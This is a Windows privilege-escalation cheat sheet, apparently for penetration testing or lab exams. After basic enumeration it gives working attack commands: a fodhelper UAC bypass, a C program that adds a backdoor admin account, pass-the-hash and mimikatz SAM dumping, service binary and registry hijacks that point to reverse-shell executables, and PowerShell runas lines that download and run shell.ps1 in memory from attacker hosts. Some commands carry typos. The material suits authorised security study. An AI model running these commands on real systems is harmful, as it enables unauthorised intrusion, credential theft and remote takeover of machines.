## Windows privilege Escalation

* Automated enumeration scripts

```
// https://github.com/pentestmonkey/windows-privesc-check
windows-privesc-check2.exe --dump -a -o report.txt
//https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
```

* Enumerating Users

```
whoami
whoami /all		#groups, permissions, etc
whoami /groups	# check cmd integrity level
net user
net user /domain			# AD users
net user <username>
net user jeff_admin /domain # AD user jeff_admin
echo %username%
net accounts		# domain's account policy
```

* Get System information

```
systeminfo | findst r /B /C: "OS Name" /C:"OS Version" /C:"System Type"
hostname
```

* Enumerating Running Processes and Services

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

tasklist / SVC
```

* Enumerating Networking Information

```
ipconfig /all
route print
netstat -ano
```

* Enumerating Firewall Status and Rules

```
netsh advfirewa11 show currentprofile
netsh advfirewall firewall show rule name=all
```

* Enumerating Scheduled Tasks

```
schtasks /query /fo LIST /v
```

* Enumerating Installed Applications and Patch Levels

```
// Does not list applications that do not use the Windows Installer
wmic product get name, version, vendor

wmic qfe get Caption, Description, HotFixID, InstaltedOn
```

* Enumerating Readable/Writable Files and Directories

```
accesschk.exe -uws "Everyone" "C:\Program Files"

// powershell cmdlet
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

* Enumerating Unmounted Disks

```
mountvol
```

* Enumerating Device Drivers

```
// list drivers, use powershell to filter output
driverquery.exe / v / fo csv | Convertfrom-CSV | Select-Object 'Display Name', ' Start Mode', 'Path'

// Get driver version and other details 
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

* Enumerating Binaries That AutoElevate

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

// If any of this key is enabled (set to 1), we could craft an MSI file and run it to elevate our privileges.
```

* Elevating Medium to High integrity shell using fodhelper.exe (admin required)

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
C:\Windows\System32\fodhelper.exe
```

* Checking file permissions

```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
```

* C program to create admin user - compile with gcc to create exeutable

```
#include <stdlib.h>
int main ()
{
int i;
i = system ( "net user evil Ev!lpass /add") ;
i = system ("net localgroup administrators evil /add");
return 0;
}
```

* Pass-The-Hash attacks(requires SMB + NTLM)

Existing tools - PsExec from Metasploit, Passing-the-hash toolkit, and Impacket

```
// https://github.com/byt3bl33d3r/pth-toolkit
kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d7a78e2eb3b9f05c425e //10.11.0.22 cmd
```

* File Transfer (use BASH ALIAS function for powershell)

```
# On KALI
# use double-quotes if file path has spaces in it 
sudo impacket-smbserver abcd /path/to/serve

# mount drives
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete
# PowerShell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
Remove-PSDrive -Name abcd

# OR copy directly from the share without mounting
copy //kali_ip/abcd/file_name C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
copy "C:\Program Files\..\legit.exe" C:\Temp
copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"

# Download to Windows
# Load script in memory
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe iex (iwr http://ip/file -usebasicparsing)

# Save script on disk
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
certutil -urlcache -f http://kali_ip/file file

# Wget.ps1
echo $storageDir = $pwd >> wget.ps1
$webclient = New-Object System.Net.WebClient >> wget.ps1
# Download file from
$url = "http://<ip>/file_name" >> wget.ps1
# Save file as
$file = "file_name"
echo $webclient.DownloadFile($url,$file) >>wget.ps1
# execute the script as follows
powershell.exe -nop -ep bypass -nol -noni -f wget.ps1

TFTP
tftp -i <ip> get file_name

SMB
# cmd.exe
net use Z: \\<attacker_ip>\share_name
# To access the drive
Z:
# PowerShell
New-PSDrive -Name "notmalicious" -PSProvider "FileSystem" -Root "\\attacker_ip\share_name"
# To access the drive
notmalicious:

FTP
ftp <ip>
ftp>binary
ftp>get file_name

# One-liner downloader
# in cmd.exe do not use quotes in an echo command
echo open <ip> >> download.txt
echo anonymous >> download.txt
echo anon >> download.txt
echo binary >> download.txt
get file_name >> download.txt
bye >> download.txt
ftp -s:download.txt
```

* Check for alternate data streams

```
dir /r | find ":$DATA"
```

* Extract hash from SAM Database

```
Hashed user passwords in the Security Accounts Manager

SAM Database cannot be copied while OS is running but can use mimikatz to dump SAM hashes
    Mimikatz extract from SAM  
    SeDebugPrivilge is enabled might be able to run mimikatz with admin cmd 
    command: privilege::debug 
    LSASS is a SYSTEM process
    command: token::elevate to elevate the scurity token from high integrity to SYSTEM integrity
    command: lsadump::sam to dump contents of SAM database 
```

* Windows PrivEsc Guide

```
// https://noobsec.net/
// https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
```

* AppLocker

```
# Check AppLocker policy
Get-AppLockerPolicy -Effective
# View RuleCollections in detail
Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
```

* Accesschk

```
# .\accesschk.exe /accepteula
# -c : Name a windows service, or use * for all
# -d : Only process directories
# -k : Name a registry key e.g., hklm/software
# -q : Omit banner
# -s : Recurse
# -u : Suppress errors
# -v : Verbose
# -w : Show objects with write access

# Check service permissions
# ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
.\accesschk.exe /accepteula -ucqv <user> <svc_name>

# Get all writable services as per groups
.\accesschk.exe /accepteual -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Is dir writable? - Unquoted service paths
.\accesschk.exe /accepteula -uwdv "C:\Program Files"

# User permissions on an executable
.\accesschk.exe /accepteula -uqv "C:\Program Files\...\file.exe"

# Find all weak permissions - folders
.\accesschk.exe /accepteula -uwdqs Users c:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak permissions - files
.\accesschk.exe /accepteula -uwqs Users c:\*.*
.\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

# Registry ACL - Weak registry permissions
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
# PowerShell
Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List

# Get rights of any file, or folder
# PowerShell
(get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
```

* sc.exe

```
# Query service configuration
# Verify after doing all the changes
sc qc svc

# Current state of the service
sc query svc

# Modify config
sc config svc binpath= "\"C:\Downloads\shell.exe\""

# if dependencies exist
sc config depend_svc start= auto
net start depend_svc
net start svc

# can instead remove dependency too
sc config svc depend= ""

# Start/stop the service
net start/stop svc
```

* Registry

```
# Query configuration of registry entry of the service
reg query HKLM\System\CurrentControlSet\Services\svc_name

# Point the ImagePath to malicious executable
reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f

# Start/stop the service to get the shell
net start/stop svc

# Execute a reverse_shell.msi as admin
# Manually, both query's output should be 0x1 to exploit
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

* Credentials or Hashes

```
Windows NT Operating Systems up to Windows 2003 store LM and NTLM password hashes
Windows Vista and onwards disables LM by default and uses NTLM while NTLM hashes are unsalted

# Common creds location, always in plaintext
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# If found, prints the location of the file
dir /s <filename> # or extensions
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml

# Found creds?
# On KALI
# --system only works if admin creds are on hand
winexe -U 'admin%pass123' [--system] //10.10.10.10 cmd.exe
# Found hash?
pth-winexe -U 'domain\admin%LM:NTLM' [--system] //10.10.10.10 cmd.exe
```

* Runas

```
# cmd
runas /savecred /user:admin C:\abcd\reverse.exe

# PowerShell Runas 1
$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred

# PowerShell Runas 2
$username = "domain\Administrator"
$password = "pass123"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```